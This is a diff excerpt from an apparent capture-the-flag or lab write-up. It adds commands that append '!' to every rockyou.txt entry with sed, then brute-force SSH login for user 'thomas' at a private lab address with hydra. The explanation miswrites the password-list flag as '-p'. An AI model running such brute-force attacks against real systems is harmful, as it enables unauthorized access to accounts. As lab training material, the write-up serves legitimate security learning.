@@ -135,3 +135,11 @@ In todo file, we can see that thomas has to take a exclamation point to his pass
 So maybe we can try to add a exclamation point to the password of thomas with sed and exploit it with hydra and rockyou.txt.
 
 ```bash
+$ cat rockyou.txt | sed 's/$/!/g' > wordlist
+```
+Now, the new wordlist can be used with Hydra.
+
+```bash
+$ hydra -l thomas -P wordlist ssh://10.0.2.9 -t 4
+```
+-l for login, -p for password list and -t for the tasks in parallel
